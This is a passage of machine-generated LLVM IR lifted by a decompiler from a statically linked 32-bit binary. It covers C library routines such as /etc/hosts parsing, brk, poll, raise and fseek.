  %v0_805366b.lcssa = phi i32 [ %v0_805366c.pre, %dec_label_pc_805365e ], [ %v1_805366b, %dec_label_pc_805366b ], [ %v0_805366b67, %dec_label_pc_8053672 ], [ %v0_805366b67, %dec_label_pc_8053680 ]
  %v6_805366c.lcssa = phi i32 [ %v6_805366c64, %dec_label_pc_805365e ], [ %v6_805366c, %dec_label_pc_805366b ], [ %v6_805366c69, %dec_label_pc_8053672 ], [ %v6_805366c69, %dec_label_pc_8053680 ]
  %v1_805368b75 = inttoptr i32 %v0_805366b.lcssa to i8*
  %v2_805368b76 = load i8, i8* %v1_805368b75, align 1
  %v3_805368b77 = zext i8 %v2_805368b76 to i32
  %v5_805368b78 = and i32 %v6_805366c.lcssa, -256
  %v6_805368b79 = or i32 %v3_805368b77, %v5_805368b78
  store i32 %v6_805368b79, i32* @ecx, align 4
  %v4_805368d80 = icmp eq i8 %v2_805368b76, 0
  br i1 %v4_805368d80, label %dec_label_pc_80536a4, label %dec_label_pc_8053691

dec_label_pc_8053687:                             ; preds = %dec_label_pc_805369f, %dec_label_pc_8053691
  store i8 0, i8* %v1_805368b83, align 1
  %v0_805368a = load i32, i32* @ebx, align 4
  %v1_805368a = add i32 %v0_805368a, 1
  store i32 %v1_805368a, i32* @ebx, align 4
  %v4_805368b.pre = load i32, i32* @ecx, align 4
  %v1_805368b = inttoptr i32 %v1_805368a to i8*
  %v2_805368b = load i8, i8* %v1_805368b, align 1
  %v3_805368b = zext i8 %v2_805368b to i32
  %v5_805368b = and i32 %v4_805368b.pre, -256
  %v6_805368b = or i32 %v3_805368b, %v5_805368b
  store i32 %v6_805368b, i32* @ecx, align 4
  %v4_805368d = icmp eq i8 %v2_805368b, 0
  br i1 %v4_805368d, label %dec_label_pc_80536a4, label %dec_label_pc_8053691

dec_label_pc_8053691:                             ; preds = %dec_label_pc_805368b.preheader, %dec_label_pc_8053687
  %v2_805368b84 = phi i8 [ %v2_805368b, %dec_label_pc_8053687 ], [ %v2_805368b76, %dec_label_pc_805368b.preheader ]
  %v1_805368b83 = phi i8* [ %v1_805368b, %dec_label_pc_8053687 ], [ %v1_805368b75, %dec_label_pc_805368b.preheader ]
  %v0_80536a882 = phi i32 [ %v1_805368a, %dec_label_pc_8053687 ], [ %v0_805366b.lcssa, %dec_label_pc_805368b.preheader ]
  %v0_8053691 = load i32, i32* @global_var_8059dd8, align 8
  store i32 %v0_8053691, i32* @eax, align 4
  %v2_8053696 = sext i8 %v2_805368b84 to i32
  store i32 %v2_8053696, i32* @edx, align 4
  %v2_8053699 = mul nsw i32 %v2_8053696, 2
  %v3_8053699 = add i32 %v0_8053691, %v2_8053699
  %v4_8053699 = inttoptr i32 %v3_8053699 to i8*
  %v5_8053699 = load i8, i8* %v4_8053699, align 1
  %v6_8053699 = and i8 %v5_8053699, 32
  %v7_8053699 = icmp eq i8 %v6_8053699, 0
  %v1_805369d = icmp eq i1 %v7_8053699, false
  br i1 %v1_805369d, label %dec_label_pc_8053687, label %dec_label_pc_805369f

dec_label_pc_805369f:                             ; preds = %dec_label_pc_8053691
  %v10_805369f = icmp eq i8 %v2_805368b84, 10
  br i1 %v10_805369f, label %dec_label_pc_8053687, label %dec_label_pc_80536a4

dec_label_pc_80536a4:                             ; preds = %dec_label_pc_8053687, %dec_label_pc_805369f, %dec_label_pc_805368b.preheader
  %v0_80536a8.lcssa = phi i32 [ %v0_805366b.lcssa, %dec_label_pc_805368b.preheader ], [ %v0_80536a882, %dec_label_pc_805369f ], [ %v1_805368a, %dec_label_pc_8053687 ]
  %v1_805368b.lcssa = phi i8* [ %v1_805368b75, %dec_label_pc_805368b.preheader ], [ %v1_805368b83, %dec_label_pc_805369f ], [ %v1_805368b, %dec_label_pc_8053687 ]
  %v4_80536a4 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_80536a8 = load i8, i8* %v1_805368b.lcssa, align 1
  %v3_80536a8 = icmp eq i8 %v2_80536a8, 0
  br i1 %v3_80536a8, label %dec_label_pc_80536b4, label %dec_label_pc_80536ad

dec_label_pc_80536ad:                             ; preds = %dec_label_pc_80536a8.preheader, %dec_label_pc_80536a4
  %v0_8053662 = phi i32 [ %v0_80536a8.lcssa, %dec_label_pc_80536a4 ], [ %v0_805362a56, %dec_label_pc_80536a8.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_80536a4, %dec_label_pc_80536a4 ], [ 0, %dec_label_pc_80536a8.preheader ]
  %v7_80536b2 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_80536b2, label %dec_label_pc_80536b4, label %dec_label_pc_805365e

dec_label_pc_80536b4:                             ; preds = %dec_label_pc_80536a4, %dec_label_pc_80536ad, %dec_label_pc_80536a8.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_80536a8.preheader ], [ %v4_80536a4, %dec_label_pc_80536a4 ], [ %stack_var_-196.013, %dec_label_pc_80536ad ]
  store i32 %tmp, i32* @edi, align 4
  %v0_80536bb = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8058647.249 to i32), i32* %stack_var_-216, align 4
  %v5_80536c8 = call i32 @__GI_strcoll(i8* %v4_80536c8, i32 ptrtoint ([11 x i8]* @global_var_8058647.249 to i32), i32 %v0_80536bb, i32 %v0_80536bb)
  store i32 %v5_80536c8, i32* @eax, align 4
  %v1_80536d0 = icmp eq i32 %v5_80536c8, 0
  br i1 %v1_80536d0, label %dec_label_pc_80536f8.preheader, label %dec_label_pc_8053709

dec_label_pc_80536f8.preheader:                   ; preds = %dec_label_pc_80536b4
  %v0_80536f889 = load i32, i32* @esi, align 4
  %v5_80536fc98 = icmp slt i32 %v0_80536f889, %stack_var_-196.0.lcssa
  br i1 %v5_80536fc98, label %dec_label_pc_80536fe.lr.ph, label %dec_label_pc_8053709

dec_label_pc_80536fe.lr.ph:                       ; preds = %dec_label_pc_80536f8.preheader
  %v0_80536fe.pre = load i32, i32* @global_var_8060734.184, align 4
  br label %dec_label_pc_80536fe

dec_label_pc_80536d6:                             ; preds = %dec_label_pc_80536fe
  %v2_80536d9 = mul i32 %v0_80536f899, 4
  %v4_80536d9 = add i32 %v2_80536d9, %v3_80536d9
  %v5_80536d9 = inttoptr i32 %v4_80536d9 to i32*
  %v6_80536d9 = load i32, i32* %v5_80536d9, align 4
  %v1_80536e0 = add i32 %v0_80536f899, 1
  store i32 %v1_80536e0, i32* @esi, align 4
  %v1_80536e1 = inttoptr i32 %v6_80536d9 to i8*
  %v2_80536e1 = call i32 @__GI_strdup(i8* %v1_80536e1)
  %v1_80536e9 = load i32, i32* @ebx, align 4
  %v2_80536e9 = mul i32 %v1_80536e9, 4
  %v3_80536e9 = add i32 %v2_80536e9, 134612776
  %v4_80536e9 = inttoptr i32 %v3_80536e9 to i32*
  store i32 %v2_80536e1, i32* %v4_80536e9, align 4
  %v0_80536f0 = load i32, i32* @ebx, align 4
  %v1_80536f0 = add i32 %v0_80536f0, 1
  store i32 %v1_80536f0, i32* @eax, align 4
  store i32 %v1_80536f0, i32* @global_var_8060734.184, align 4
  %v0_80536f8 = load i32, i32* @esi, align 4
  %v5_80536fc = icmp slt i32 %v0_80536f8, %stack_var_-196.0.lcssa
  br i1 %v5_80536fc, label %dec_label_pc_80536fe, label %dec_label_pc_8053709

dec_label_pc_80536fe:                             ; preds = %dec_label_pc_80536fe.lr.ph, %dec_label_pc_80536d6
  %v0_80536fe = phi i32 [ %v0_80536fe.pre, %dec_label_pc_80536fe.lr.ph ], [ %v1_80536f0, %dec_label_pc_80536d6 ]
  %v0_80536f899 = phi i32 [ %v0_80536f889, %dec_label_pc_80536fe.lr.ph ], [ %v0_80536f8, %dec_label_pc_80536d6 ]
  store i32 %v0_80536fe, i32* @ebx, align 4
  %v7_8053707 = icmp sgt i32 %v0_80536fe, 2
  br i1 %v7_8053707, label %dec_label_pc_8053709, label %dec_label_pc_80536d6

dec_label_pc_8053709:                             ; preds = %dec_label_pc_80536f8.preheader, %dec_label_pc_80536d6, %dec_label_pc_80536fe, %dec_label_pc_80536b4
  %v0_8053709 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8058652.250 to i32), i32* %stack_var_-216, align 4
  %v0_8053710 = load i32, i32* @edi, align 4
  %v4_8053711 = inttoptr i32 %v0_8053710 to i8*
  %v5_8053711 = call i32 @__GI_strcoll(i8* %v4_8053711, i32 ptrtoint ([7 x i8]* @global_var_8058652.250 to i32), i32 %v0_8053709, i32 %v0_8053709)
  store i32 %v5_8053711, i32* @eax, align 4
  %v1_8053719 = icmp eq i32 %v5_8053711, 0
  br i1 %v1_8053719, label %dec_label_pc_805375b.preheader, label %dec_label_pc_805371d

dec_label_pc_805371d:                             ; preds = %dec_label_pc_8053709
  %v0_805371d = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8058659.251 to i32), i32* %stack_var_-216, align 4
  %v0_8053724 = load i32, i32* @edi, align 4
  %v4_8053725 = inttoptr i32 %v0_8053724 to i8*
  %v5_8053725 = call i32 @__GI_strcoll(i8* %v4_8053725, i32 ptrtoint ([7 x i8]* @global_var_8058659.251 to i32), i32 %v0_805371d, i32 %v0_805371d)
  %v1_805372d = icmp eq i32 %v5_8053725, 0
  br i1 %v1_805372d, label %dec_label_pc_805375b.preheader, label %dec_label_pc_805379e

dec_label_pc_805375b.preheader:                   ; preds = %dec_label_pc_8053709, %dec_label_pc_805371d
  %v0_805375b100 = load i32, i32* @global_var_8060738.244, align 8
  %tmp43103 = icmp slt i32 %v0_805375b100, 1
  %tmp44104 = icmp eq i1 %tmp43103, false
  br i1 %tmp44104, label %dec_label_pc_8053733, label %dec_label_pc_8053764

dec_label_pc_8053733:                             ; preds = %dec_label_pc_805375b.preheader, %dec_label_pc_8053733.dec_label_pc_8053733_crit_edge
  %v0_805375b105 = phi i32 [ %v0_805375b, %dec_label_pc_8053733.dec_label_pc_8053733_crit_edge ], [ %v0_805375b100, %dec_label_pc_805375b.preheader ]
  %v1_8053733 = add i32 %v0_805375b105, -1
  %v1_8053737 = mul i32 %v1_8053733, 4
  %v2_8053737 = add i32 %v1_8053737, 134612760
  %v3_8053737 = inttoptr i32 %v2_8053737 to i32*
  %v4_8053737 = load i32, i32* %v3_8053737, align 4
  store i32 %v1_8053733, i32* @global_var_8060738.244, align 8
  %v1_8053743 = call i32 @free(i32 %v4_8053737)
  %v0_8053748 = load i32, i32* @global_var_8060738.244, align 8
  %v1_8053750 = mul i32 %v0_8053748, 4
  %v2_8053750 = add i32 %v1_8053750, ptrtoint (i32* @global_var_8060718.252 to i32)
  %v3_8053750 = inttoptr i32 %v2_8053750 to i32*
  store i32 0, i32* %v3_8053750, align 4
  %v0_805375b = load i32, i32* @global_var_8060738.244, align 8
  %tmp43 = icmp slt i32 %v0_805375b, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8053733.dec_label_pc_8053733_crit_edge, label %dec_label_pc_8053764

dec_label_pc_8053733.dec_label_pc_8053733_crit_edge: ; preds = %dec_label_pc_8053733
  br label %dec_label_pc_8053733

dec_label_pc_8053764:                             ; preds = %dec_label_pc_8053733, %dec_label_pc_805375b.preheader
  %v0_805375b.lcssa = phi i32 [ %v0_805375b100, %dec_label_pc_805375b.preheader ], [ %v0_805375b, %dec_label_pc_8053733 ]
  store i32 1, i32* @esi, align 4
  %v5_8053791115 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8053791115, label %dec_label_pc_8053793, label %dec_label_pc_805379e

dec_label_pc_805376b:                             ; preds = %dec_label_pc_8053793
  %v2_805376e = mul i32 %v0_8053775117, 4
  %v4_805376e = add i32 %v2_805376e, %v3_80536d9
  %v5_805376e = inttoptr i32 %v4_805376e to i32*
  %v6_805376e = load i32, i32* %v5_805376e, align 4
  %v1_8053775 = add i32 %v0_8053775117, 1
  store i32 %v1_8053775, i32* @esi, align 4
  %v1_8053776 = inttoptr i32 %v6_805376e to i8*
  %v2_8053776 = call i32 @__GI_strdup(i8* %v1_8053776)
  %v1_805377e = load i32, i32* @ebx, align 4
  %v2_805377e = mul i32 %v1_805377e, 4
  %v3_805377e = add i32 %v2_805377e, 134612760
  %v4_805377e = inttoptr i32 %v3_805377e to i32*
  store i32 %v2_8053776, i32* %v4_805377e, align 4
  %v0_8053785 = load i32, i32* @ebx, align 4
  %v1_8053785 = add i32 %v0_8053785, 1
  store i32 %v1_8053785, i32* @global_var_8060738.244, align 8
  %v0_805378d.pre = load i32, i32* @esi, align 4
  %v5_8053791 = icmp slt i32 %v0_805378d.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8053791, label %dec_label_pc_8053793, label %dec_label_pc_805379e

dec_label_pc_8053793:                             ; preds = %dec_label_pc_8053764, %dec_label_pc_805376b
  %v0_8053775117 = phi i32 [ %v0_805378d.pre, %dec_label_pc_805376b ], [ 1, %dec_label_pc_8053764 ]
  %v0_8053793116 = phi i32 [ %v1_8053785, %dec_label_pc_805376b ], [ %v0_805375b.lcssa, %dec_label_pc_8053764 ]
  store i32 %v0_8053793116, i32* @ebx, align 4
  %v7_805379c = icmp sgt i32 %v0_8053793116, 3
  br i1 %v7_805379c, label %dec_label_pc_805379e, label %dec_label_pc_805376b

dec_label_pc_805379e:                             ; preds = %dec_label_pc_805362b.preheader, %dec_label_pc_805362a, %dec_label_pc_8053764, %dec_label_pc_8053793, %dec_label_pc_805376b, %dec_label_pc_805371d, %dec_label_pc_805364c, %dec_label_pc_8053643, %dec_label_pc_805379e.preheader
  %v0_805379e = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80537a5, i32* @ebx, align 4
  %v3_80537aa = call i32 @fgets(i32 %v2_80537a5, i32 128, i32 %v0_805379e)
  store i32 %v3_80537aa, i32* @eax, align 4
  %v1_80537b2 = icmp eq i32 %v3_80537aa, 0
  %v1_80537b4 = icmp eq i1 %v1_80537b2, false
  br i1 %v1_80537b4, label %dec_label_pc_805362b.preheader, label %dec_label_pc_80537ba

dec_label_pc_805362b.preheader:                   ; preds = %dec_label_pc_805379e
  %v0_805362b.pre = load i32, i32* @ebx, align 4
  %v4_805362b.pre = load i32, i32* @ecx, align 4
  %v1_805362b49 = inttoptr i32 %v0_805362b.pre to i8*
  %v2_805362b50 = load i8, i8* %v1_805362b49, align 1
  %v3_805362b51 = zext i8 %v2_805362b50 to i32
  %v5_805362b52 = and i32 %v4_805362b.pre, -256
  %v6_805362b53 = or i32 %v3_805362b51, %v5_805362b52
  store i32 %v6_805362b53, i32* @ecx, align 4
  %v4_805362d54 = icmp eq i8 %v2_805362b50, 0
  br i1 %v4_805362d54, label %dec_label_pc_805379e, label %dec_label_pc_8053635.lr.ph

dec_label_pc_8053635.lr.ph:                       ; preds = %dec_label_pc_805362b.preheader
  %v0_8053635.pre = load i32, i32* @global_var_8059dd8, align 8
  br label %dec_label_pc_8053635

dec_label_pc_80537ba:                             ; preds = %dec_label_pc_805379e
  %v0_80537bd = load i32, i32* @ebp, align 4
  %v1_80537be = inttoptr i32 %v0_80537bd to i16*
  %v2_80537be = call i32 @__GI_fclose(i16* %v1_80537be)
  br label %dec_label_pc_80537d3

dec_label_pc_80537c8:                             ; preds = %dec_label_pc_8053607
  %v0_80537c8 = call i32 @__GI___h_errno_location()
  %v1_80537cd = inttoptr i32 %v0_80537c8 to i32*
  store i32 3, i32* %v1_80537cd, align 4
  br label %dec_label_pc_80537d3

dec_label_pc_80537d3:                             ; preds = %entry, %dec_label_pc_80537ba, %dec_label_pc_80537c8
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_80535c0, i32* @eax, align 4
  %v2_80537df = call i32 @__pthread_return_void(i32 %v2_80535c0, i32 1)
  store i32 %v0_80535ac, i32* @ebp, align 4
  ret i32 %v2_80537df

; uselistorder directives
  uselistorder i32 %v0_8053635.pre, { 1, 0 }
  uselistorder i32 %v6_805362b53, { 1, 0 }
  uselistorder i8 %v2_805362b50, { 1, 2, 0 }
  uselistorder i8* %v1_805362b49, { 1, 0 }
  uselistorder i32 %v0_805362b.pre, { 1, 0 }
  uselistorder i32 %v0_805375b, { 0, 2, 1 }
  uselistorder i32 %v0_80536fe, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8053696, { 1, 0 }
  uselistorder i32 %v2_8053677, { 1, 0 }
  uselistorder i32 %v1_805366b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805363a, { 1, 0 }
  uselistorder i32 %v1_805362a, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 0, 4, 3, 1, 2 }
  uselistorder i32 (i32)* @free, { 18, 1, 0, 16, 15, 14, 13, 12, 26, 25, 24, 23, 4, 11, 10, 9, 8, 7, 17, 2, 19, 22, 21, 20, 6, 5, 3 }
  uselistorder i32* @global_var_8060738.244, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 15, 13, 7, 16, 8, 17, 9, 10, 11, 12, 18 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8060734.184, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805a048.183 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_80537d3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805379e, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_8053793, { 1, 0 }
  uselistorder label %dec_label_pc_8053733, { 1, 0 }
  uselistorder label %dec_label_pc_805375b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8053709, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80536fe, { 1, 0 }
  uselistorder label %dec_label_pc_80536b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80536ad, { 1, 0 }
  uselistorder label %dec_label_pc_80536a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053691, { 1, 0 }
  uselistorder label %dec_label_pc_8053672, { 1, 0 }
  uselistorder label %dec_label_pc_805379e.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_8053813 = inttoptr i32 %arg3 to i32*
  %v10_8053813 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8053813, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8053813
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805381f = call i32 @__libc_getpid()
  %v2_805382b = call i32 @kill(i32 %v0_805381f, i32 %arg1)
  ret i32 %v2_805382b

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 1, 3, 0, 2 }
  uselistorder i32 ()* @__libc_getpid, { 1, 3, 2, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8053834 = load i32, i32* @eax, align 4
  %v1_8053834 = add i32 %v0_8053834, 28
  %v2_8053834 = inttoptr i32 %v1_8053834 to i32*
  %v3_8053834 = load i32, i32* %v2_8053834, align 4
  store i32 %v3_8053834, i32* @global_var_806073c.253, align 4
  %v1_805383d = add i32 %v0_8053834, 44
  %v2_805383d = inttoptr i32 %v1_805383d to i32*
  %v3_805383d = load i32, i32* %v2_805383d, align 4
  store i32 %v3_805383d, i32* @global_var_8060740.254, align 64
  ret i32 %v3_805383d
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053848 = load i32, i32* @ebx, align 4
  store i32 %v0_8053848, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805385b = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805385b, i32* @global_var_8060304.231, align 4
  %v7_8053866 = icmp ult i32 %v1_805385b, %arg1
  %v1_8053868 = icmp eq i1 %v7_8053866, false
  br i1 %v1_8053868, label %dec_label_pc_8053878, label %dec_label_pc_805386a

dec_label_pc_805386a:                             ; preds = %entry
  %v0_805386a = load i32, i32* %stack_var_-4, align 4
  %v1_805386a = call i32 @__errno_location(i32 %v0_805386a)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8053872 = inttoptr i32 %v1_805386a to i32*
  store i32 12, i32* %v1_8053872, align 4
  %v0_8053879.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053878

dec_label_pc_8053878:                             ; preds = %entry, %dec_label_pc_805386a
  %v0_8053879 = phi i32 [ 0, %entry ], [ %v0_8053879.pre, %dec_label_pc_805386a ]
  %v2_805387c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805387c, i32* @ebx, align 4
  ret i32 %v0_8053879

; uselistorder directives
  uselistorder i32 %v1_805385b, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8060304.231, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053878, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8053880 = load i32, i32* @edi, align 4
  store i32 %v0_8053880, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8053890 = load i32, i32* @ebx, align 4
  %v1_8053891 = inttoptr i32 %tmp4 to %pollfd*
  %v5_8053898 = call i32 @poll(%pollfd* %v1_8053891, i32 %tmp3, i32 %tmp)
  store i32 %v0_8053890, i32* @ebx, align 4
  store i32 %v5_8053898, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_8053898, -4095
  br i1 %tmp10, label %dec_label_pc_80538b0, label %dec_label_pc_80538a4

dec_label_pc_80538a4:                             ; preds = %entry
  %v1_80538a4 = call i32 @__errno_location(i32 %v0_8053890)
  %v0_80538a9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80538a9 = sub i32 0, %v0_80538a9
  %v2_80538ab = inttoptr i32 %v1_80538a4 to i32*
  store i32 %v1_80538a9, i32* %v2_80538ab, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80538b0

dec_label_pc_80538b0:                             ; preds = %entry, %dec_label_pc_80538a4
  %v0_80538b1 = phi i32 [ %v5_8053898, %entry ], [ -1, %dec_label_pc_80538a4 ]
  %v2_80538b4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80538b4, i32* @edi, align 4
  ret i32 %v0_80538b1

; uselistorder directives
  uselistorder i32 %v5_8053898, { 1, 0, 2 }
  uselistorder i32 %v0_8053890, { 1, 0 }
  uselistorder label %dec_label_pc_80538b0, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80538c3 = ashr i32 %arg2, 31
  %v4_80538ca = inttoptr i32 %arg1 to i16*
  %v5_80538ca = call i32 @__GI_fseeko64(i16* %v4_80538ca, i32 %arg2, i32 %v1_80538c3, i32 %arg3)
  ret i32 %v5_80538ca
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80538d4 = load i32, i32* @ebp, align 4
  %v0_80538d5 = load i32, i32* @edi, align 4
  %v0_80538d6 = load i32, i32* @esi, align 4
  %v0_80538d7 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_80538e7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80538e7, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_805390b, label %dec_label_pc_80538f8

dec_label_pc_80538f8:                             ; preds = %entry
  %v1_80538f8 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_80538f8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8053900 = inttoptr i32 %v1_80538f8 to i32*
  store i32 22, i32* %v1_8053900, align 4
  br label %dec_label_pc_80539b1

dec_label_pc_805390b:                             ; preds = %entry
  %v1_805390b = add i32 %v4_80538e7, 52
  %v2_805390b = inttoptr i32 %v1_805390b to i32*
  %v3_805390b = load i32, i32* %v2_805390b, align 4
  %v1_805390e = icmp eq i32 %v3_805390b, 0
  %v1_8053910 = icmp eq i1 %v1_805390e, false
  br i1 %v1_8053910, label %dec_label_pc_8053931, label %dec_label_pc_8053912

dec_label_pc_8053912:                             ; preds = %dec_label_pc_805390b
  %v1_8053912 = add i32 %v4_80538e7, 56
  store i32 %v1_8053912, i32* @ebx, align 4
  %v2_805391c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805391c, i32* @eax, align 4
  %v3_8053921 = call i32 @__pthread_return_void(i32 %v2_805391c, i32 134552351)
  store i32 %v3_8053921, i32* %eax.global-to-local, align 4
  %v0_8053926 = load i32, i32* @ebx, align 4
  %v2_8053929 = call i32 @__pthread_return_0(i32 %v0_8053926)
  store i32 %v2_8053929, i32* %eax.global-to-local, align 4
  %v0_8053931.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053931

dec_label_pc_8053931:                             ; preds = %dec_label_pc_805390b, %dec_label_pc_8053912
  %v0_8053939 = phi i32 [ %v4_80538e7, %dec_label_pc_805390b ], [ %v0_8053931.pre, %dec_label_pc_8053912 ]
  %v1_8053931 = inttoptr i32 %v0_8053939 to i8*
  %v2_8053931 = load i8, i8* %v1_8053931, align 1
  %v3_8053931 = and i8 %v2_8053931, 64
  %v4_8053931 = icmp eq i8 %v3_8053931, 0
  br i1 %v4_8053931, label %dec_label_pc_8053946, label %dec_label_pc_8053936

dec_label_pc_8053936:                             ; preds = %dec_label_pc_8053931
  %v2_805393a = call i32 @__stdio_wcommit(i32 %v0_8053939)
  store i32 %v2_805393a, i32* %eax.global-to-local, align 4
  %v1_8053942 = icmp eq i32 %v2_805393a, 0
  %v1_8053944 = icmp eq i1 %v1_8053942, false
  br i1 %v1_8053944, label %dec_label_pc_8053999, label %dec_label_pc_8053946

dec_label_pc_8053946:                             ; preds = %dec_label_pc_8053936, %dec_label_pc_8053931
  %v0_8053946 = load i32, i32* @edi, align 4
  %v9_8053946 = icmp eq i32 %v0_8053946, 1
  %v1_8053949 = icmp eq i1 %v9_8053946, false
  br i1 %v1_8053949, label %dec_label_pc_8053946.dec_label_pc_805395f_crit_edge, label %dec_label_pc_805394b

dec_label_pc_8053946.dec_label_pc_805395f_crit_edge: ; preds = %dec_label_pc_8053946
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_805395f

dec_label_pc_805394b:                             ; preds = %dec_label_pc_8053946
  %v0_805394b = load i32, i32* @ecx, align 4
  %v2_805394d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_805394d, i32* %eax.global-to-local, align 4
  %v0_8053952 = load i32, i32* @esi, align 4
  %v5_8053952 = inttoptr i32 %v0_8053952 to i16*
  %v6_8053953 = call i32 @__stdio_adjust_position(i16* %v5_8053952, i32 %v2_805394d, i32 %v0_805394b, i32 %v0_805394b)
  store i32 %v6_8053953, i32* %eax.global-to-local, align 4
  %v2_805395b = icmp slt i32 %v6_8053953, 0
  br i1 %v2_805395b, label %dec_label_pc_8053999, label %dec_label_pc_805394b.dec_label_pc_805395f_crit_edge

dec_label_pc_805394b.dec_label_pc_805395f_crit_edge: ; preds = %dec_label_pc_805394b
  %v0_8053960.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805395f

dec_label_pc_805395f:                             ; preds = %dec_label_pc_8053946.dec_label_pc_805395f_crit_edge, %dec_label_pc_805394b.dec_label_pc_805395f_crit_edge
  %v2_8053961.pre-phi = phi i32 [ %.pre6, %dec_label_pc_8053946.dec_label_pc_805395f_crit_edge ], [ %v2_805394d, %dec_label_pc_805394b.dec_label_pc_805395f_crit_edge ]
  %v0_8053960 = phi i32 [ %v0_8053946, %dec_label_pc_8053946.dec_label_pc_805395f_crit_edge ], [ %v0_8053960.pre, %dec_label_pc_805394b.dec_label_pc_805395f_crit_edge ]
  %v0_805395f = load i32, i32* @edx, align 4
  store i32 %v2_8053961.pre-phi, i32* %eax.global-to-local, align 4
  %v0_8053966 = load i32, i32* @esi, align 4
  %v5_8053967 = inttoptr i32 %v2_8053961.pre-phi to i32*
  %v6_8053967 = call i32 @__stdio_seek(i32 %v0_8053966, i32* %v5_8053967, i32 %v0_8053960, i32 %v0_805395f)
  store i32 %v6_8053967, i32* %eax.global-to-local, align 4
  %v2_805396f = icmp slt i32 %v6_8053967, 0
